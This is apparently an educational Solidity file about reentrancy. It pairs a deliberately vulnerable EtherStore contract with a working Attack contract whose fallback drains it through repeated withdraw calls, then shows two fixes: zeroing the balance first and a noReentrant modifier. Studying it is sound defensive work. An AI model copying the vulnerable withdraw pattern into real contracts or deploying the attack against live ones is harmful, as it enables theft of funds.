//SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint balance = balances[msg.sender];
        require(balance > 0);

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReEntrancyGuard {
    mapping(address => uint) public balances;
    bool internal locked;

    // The reentrancy guard prevents reentrant calls to withdraw()
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    //pattern1
    // function withdraw() public {
    //     uint balance = balances[msg.sender];
    //     require(balance > 0);
    //     //ここでbalanceを０にしているので、攻撃ができない
    //     balances[msg.sender] = 0;

    //     (bool sent, ) = msg.sender.call{value: balance}("");
    //     require(sent, "Failed to send Ether");
    // }

    //pattern2
    // Withdraw with a reentrancy guard modifier
    function withdraw() public noReentrant{
        uint balance = balances[msg.sender];
        require(balance > 0);

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReEntrancyGuardAttack {
    ReEntrancyGuard public reEntrancyGuard;

    constructor(address _reEntrancyGuardAddress) {
        reEntrancyGuard = ReEntrancyGuard(_reEntrancyGuardAddress);
    }

    // Fallback is called when reEntrancyGuard sends Ether to this contract.
    fallback() external payable {
        if (address(reEntrancyGuard).balance >= 1 ether) {
            reEntrancyGuard.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reEntrancyGuard.deposit{value: 1 ether}();
        reEntrancyGuard.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}